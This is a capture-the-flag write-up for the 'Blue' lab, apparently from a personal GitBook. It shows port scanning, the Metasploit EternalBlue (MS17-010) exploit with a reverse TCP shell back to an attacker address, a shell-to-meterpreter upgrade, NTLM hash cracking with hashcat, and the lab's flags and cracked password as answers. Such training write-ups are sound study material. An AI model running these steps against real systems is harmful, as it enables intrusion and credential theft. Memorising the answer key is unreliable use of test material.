# Blue

## Task 1 Recon

#### How many ports are open with a port number under 1000?

```bash
sudo nmap -p-1000 10.10.172.0
# 135/tcp open  msrpc
# 139/tcp open  netbios-ssn
# 445/tcp open  microsoft-ds
```

#### What is this machine vulnerable to?

![](<../../.gitbook/assets/Screenshot from 2021-09-06 10-33-26.png>)

{% hint style="success" %}
`MS17-010`
{% endhint %}

## Task 2 Gain Access

#### Find the exploitation code we will run against the machine. What is the full path of the code?

```bash
sudo msfdb start
msf > search type:exploit ms17-010
# 0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
msf > use 0
```

{% hint style="success" %}
`exploit/windows/smb/ms17_010_eternalblue`
{% endhint %}

#### Show options and set the one required value. What is the name of this value?

```
msf > set RHOSTS 10.10.172.0
```

{% hint style="success" %}
`RHOSTS`
{% endhint %}

```
msf > set payload windows/x64/shell/reverse_tcp
msf > set LHOST 10.17.20.154
msf > exploit
^Z
```

## Task 3 Escalate

#### Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use?

```bash
msf > search shell_to_meterpreter
# 0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
```

{% hint style="success" %}
`post/multi/manage/shell_to_meterpreter` &#x20;
{% endhint %}

#### Select this module. Show options, what option are we required to change?

```
msf > use 0
msf > show options
msf > set SESSION 1
```

{% hint style="success" %}
`SESSION`
{% endhint %}

```bash
msf > exploit
# Not working for unknown reasons
msf > sessions -i 2
```

![](<../../.gitbook/assets/Screenshot from 2021-09-06 11-38-21.png>)

![](<../../.gitbook/assets/Screenshot from 2021-09-06 11-39-41.png>)

![](<../../.gitbook/assets/Screenshot from 2021-09-06 11-40-22.png>)

## Task 4 Cracking

#### What is the name of the non-default user?

![](<../../.gitbook/assets/Screenshot from 2021-09-06 11-42-58.png>)

{% hint style="success" %}
`Jon`
{% endhint %}

#### Copy this password hash to a file and research how to crack it. What is the cracked password?

```bash
echo 'Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::' > hash.txt
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

{% hint style="success" %}
`alqfna22`
{% endhint %}

## Task 5 Find flags!

#### Flag1? This flag can be found at the system root.

![](<../../.gitbook/assets/Screenshot from 2021-09-06 11-59-09.png>)

{% hint style="success" %}
`flag{access_the_machine}`
{% endhint %}

#### Flag2? This flag can be found at the location where passwords are stored within Windows.

![](<../../.gitbook/assets/Screenshot from 2021-09-06 12-00-43.png>)

{% hint style="success" %}
`flag{sam_database_elevated_access}`
{% endhint %}

#### flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

![](<../../.gitbook/assets/Screenshot from 2021-09-06 12-05-30.png>)

{% hint style="success" %}
`flag{admin_documents_can_be_valuable}`
{% endhint %}
